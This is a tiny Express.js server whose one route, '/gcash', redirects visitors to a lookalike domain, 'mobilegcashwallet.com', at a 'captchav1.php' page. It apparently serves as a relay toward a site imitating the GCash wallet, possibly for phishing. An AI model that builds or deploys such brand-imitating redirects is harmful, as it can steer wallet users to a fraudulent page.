const express = require('express');
const app = express();

// Define a route to redirect to the website
app.get('/gcash', (req, res) => {
  res.redirect('https://mobilegcashwallet.com/captchav1.php');
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
